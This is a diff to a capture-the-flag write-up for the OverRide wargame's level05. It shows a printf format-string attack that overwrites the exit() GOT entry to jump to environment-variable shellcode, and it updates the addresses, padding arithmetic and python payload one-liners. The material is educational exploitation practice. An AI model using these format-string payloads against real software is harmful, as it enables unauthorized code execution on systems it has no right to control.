@@ -69,25 +69,26 @@ Breakpoint 1 at 0x8048448
 0xffffd8a8:	 "SHELL=/bin/bash"
 ```
 Our malicious shellcode is at ```0xffffd822```. 
-Note: we want to move past the first 10 bytes "SHELLCODE=" and into your NOP slide, so let's make the address of our shellcode ```0xffffd822 + A (10 bytes) -> 0xffffd826```.
+
+Note: we want to move past the first 10 bytes "SHELLCODE=" and into your NOP slide... so let's make the address of our shellcode ```0xffffd822 + 16 bytes -> 0xffffd832```.
 
 We are going to insert this malicious code using a ```printf()``` format string attack. 
 
-Unfortunately, ```0xffffd826``` is too large to pass to ```printf()``` in decimal with a ```%d``` format (it overflows maxint).
+Unfortunately, ```0xffffd832``` is too large to pass to ```printf()``` in decimal with a ```%d``` format (it overflows maxint).
 ```
 2147483647 <- maximum size of int
-4294957094 <- address of shellcode (in decimal)
+4294957106 <- address of shellcode (in decimal)
 ```
 We can, however, pass it in decimal as 2 short ints (written on 2 bytes each). 
 Note: reverse order for little endian! 
 ```
-0xffffd826
-0xd826 -> 55334
+0xffffd832
+0xd832 -> 55346
 0xffff -> 65535
 ```
 
 We are going to use our format string to overwrite the call to ```exit()```. 
-The GOT address of ```exit()``` is ```0x80497e0```.
+The GOT address of ```exit()``` is ```0x080497e0```.
 ```
 level05@OverRide:~$ gdb -q level05
 (gdb) info function exit
@@ -110,8 +111,8 @@ So our attack takes place in 2 steps:
 - format string attack
   - exit GOT address, split into two [4 byte] parts
   - shellcode address in decimal, split into two [4 byte] parts
-      - ``` 55334 - 8 bytes (of characters already written)``` -> ```55326```
-      - ```65535 - 55326 bytes (of characters already written)``` -> ```10209```
+      - ``` 55346 - 8 bytes (of characters already written)``` -> ```55338```
+      - ```65535 - 55338 bytes (of characters already written)``` -> ```10197```
   -  ```printf()``` formatting arguments: 
       - ```%10$hn``` for 10th argument, half word/short int [2 bytes]
       - ```%11$hn``` for 11th argument, half word/short int [2 bytes]
@@ -121,13 +122,13 @@ So our attack takes place in 2 steps:
 
 Let's try it. 
 ```
-(python -c 'print("\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%55326d%10$hn" + "%10209d%11$hn")'; cat) | ./level05
+(python -c 'print("\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%55338d%10$hn" + "%10197d%11$hn")'; cat) | ./level05
 ```
 
 Why we can't just do this (with a %u modifier) is beyond me!
 ```(python -c 'print "\xe0\x97\x04\x08" + "%4294957094u" + "%10$n"'; cat) | ./level05```
 
-```(python -c 'print "\xe0\x97\x04\x08" + "%4294957090u" + "%10$n"'; cat) | ./level05```
+```(python -c 'print "\xe0\x97\x04\x08" + "%4294957098u" + "%10$n"'; cat) | ./level05```
 
 
 ```
